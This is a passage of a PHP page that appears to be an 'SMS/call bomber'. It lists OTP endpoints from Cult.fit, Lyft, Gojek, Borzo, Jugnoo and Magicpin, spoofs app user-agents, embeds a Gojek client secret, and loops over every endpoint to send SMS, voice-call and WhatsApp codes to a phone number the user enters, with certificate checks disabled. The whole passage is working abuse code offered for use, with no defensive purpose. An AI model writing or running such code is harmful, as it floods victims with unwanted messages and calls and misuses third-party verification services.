                "url" => "https://www.cult.fit/api/auth/loginPhoneSendOtp",
                "headers" => [
                    "User-Agent: okhttp/4.11.0",
                    "Accept: application/json",
                    "appsource: flutter",
                    "content-type: application/json; charset=utf-8"
                ],
                "method" => "POST",
                "data" => json_encode(["phone" => $mobile, "medium" => "sms", "countryCallingCode" => "+91"])
            ],
            // API 32: Cult.fit Call OTP
            [
                "name" => "Cult.fit Call OTP",
                "url" => "https://www.cult.fit/api/auth/loginPhoneSendOtp",
                "headers" => [
                    "User-Agent: okhttp/4.11.0",
                    "Accept: application/json",
                    "appsource: flutter",
                    "content-type: application/json; charset=utf-8"
                ],
                "method" => "POST",
                "data" => json_encode(["phone" => $mobile, "medium" => "call", "countryCallingCode" => "+91"])
            ],
            // API 33: Lyft SMS Auth
            [
                "name" => "Lyft SMS Auth",
                "url" => "https://api.lyft.com/v1/phoneauth",
                "headers" => [
                    "User-Agent: lyft:android:9:2026.18.3.1778656910",
                    "Accept: application/x-protobuf,application/json",
                    "Accept-Encoding: gzip",
                    "content-type: application/json; charset=utf-8"
                ],
                "method" => "POST",
                "data" => json_encode(["phone_number" => "+91" . $mobile, "voice_verification" => false])
            ],
            // API 34: Lyft Call Auth
            [
                "name" => "Lyft Call Auth",
                "url" => "https://api.lyft.com/v1/phoneauth",
                "headers" => [
                    "User-Agent: lyft:android:9:2026.18.3.1778656910",
                    "Accept: application/x-protobuf,application/json",
                    "Accept-Encoding: gzip",
                    "content-type: application/json; charset=utf-8"
                ],
                "method" => "POST",
                "data" => json_encode(["phone_number" => "+91" . $mobile, "voice_verification" => true])
            ],
            // API 35: Gojek SMS OTP
            [
                "name" => "Gojek SMS OTP",
                "url" => "https://accounts.goto-products.com/cvs/v1/initiate",
                "headers" => [
                    "User-Agent: Gojek/5.61.1 (com.gojek.app; build:5612; Android, 9)",
                    "Accept: application/json",
                    "Accept-Encoding: gzip",
                    "Content-Type: application/json; charset=UTF-8"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "client_id" => "gojek:consumer:app",
                    "client_secret" => "pGwQ7oi8bKqqwvid09UrjqpkMEHklb",
                    "country_code" => "+91",
                    "flow" => "signup_na",
                    "phone_number" => $mobile,
                    "verification_method" => "otp_sms"
                ])
            ],
            // API 36: Gojek WhatsApp OTP
            [
                "name" => "Gojek WhatsApp OTP",
                "url" => "https://accounts.goto-products.com/cvs/v1/initiate",
                "headers" => [
                    "User-Agent: Gojek/5.61.1 (com.gojek.app; build:5612; Android, 9)",
                    "Accept: application/json",
                    "Accept-Encoding: gzip",
                    "Content-Type: application/json; charset=UTF-8"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "client_id" => "gojek:consumer:app",
                    "client_secret" => "pGwQ7oi8bKqqwvid09UrjqpkMEHklb",
                    "country_code" => "+91",
                    "flow" => "signup_na",
                    "phone_number" => $mobile,
                    "verification_method" => "otp_wa"
                ])
            ],
            // API 37: Borzo Send Verification SMS
            [
                "name" => "Borzo Send Verification SMS",
                "url" => "https://robot-in.borzodelivery.com/api/client/2.136/send-verification-sms",
                "headers" => [
                    "User-Agent: client-app-global-android/1.128.0.2456",
                    "Accept-Encoding: gzip",
                    "content-type: application/json; charset=UTF-8"
                ],
                "method" => "POST",
                "data" => json_encode([
                    "phone" => "91" . $mobile,
                    "source" => "person_login",
                    "unique_device_id" => "db303d202ae70f52521d9b5414e9af197efc6a8afe0fab9ea72c73a23ebe22ca",
                    "notification_token" => "",
                    "force_sms" => false,
                    "push_service" => ""
                ])
            ],
            // API 38: Jugnoo Generate Login OTP
            [
                "name" => "Jugnoo Generate Login OTP",
                "url" => "https://prod-autos-api.jugnoo.in/v4/customer/generate_login_otp",
                "headers" => [
                    "User-Agent: okhttp/5.0.0-alpha.2",
                    "Accept-Encoding: gzip",
                    "content-type: application/x-www-form-urlencoded; charset=UTF-8"
                ],
                "method" => "POST",
                "data" => "phone_no=+91" . $mobile . "&country=India&country_code=+91&login_type=0",
                "is_form" => true
            ],
            // API 39: Magicpin SMS OTP
            [
                "name" => "Magicpin SMS OTP",
                "url" => "https://auth.magicpin.in/SendOtp/V2/",
                "headers" => [
                    "User-Agent: okhttp/4.12.0",
                    "Accept-Encoding: gzip",
                    "content-type: application/json; charset=UTF-8"
                ],
                "method" => "POST",
                "data" => json_encode(["phone_no" => "91" . $mobile, "sms_service_flag" => "0"])
            ],
            // API 40: Magicpin Call OTP
            [
                "name" => "Magicpin Call OTP",
                "url" => "https://auth.magicpin.in/SendOtpByCall/",
                "headers" => [
                    "User-Agent: okhttp/4.12.0",
                    "Accept-Encoding: gzip",
                    "content-type: application/json; charset=UTF-8"
                ],
                "method" => "POST",
                "data" => json_encode(["phone_no" => "91" . $mobile])
            ]
        ];

        foreach ($apis as $api) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $api['url']);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $api['headers']);
            
            if ($api['method'] == "GET") {
                curl_setopt($ch, CURLOPT_HTTPGET, true);
            } else {
                curl_setopt($ch, CURLOPT_POST, true);
                if (isset($api['is_form']) && $api['is_form'] === true) {
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $api['data']);
                } else {
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $api['data']);
                }
            }
            
            $response = curl_exec($ch);
            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            echo "<h3>" . $api['name'] . "</h3>";
            echo "<p><strong>API URL:</strong> " . $api['url'] . "</p>";
            echo "<p><strong>Response:</strong> " . htmlspecialchars($response) . "</p>";
            echo "<p><strong>Status Code:</strong> " . $httpcode . "</p><hr>";
        }
    }
    ?>
</body>
</html>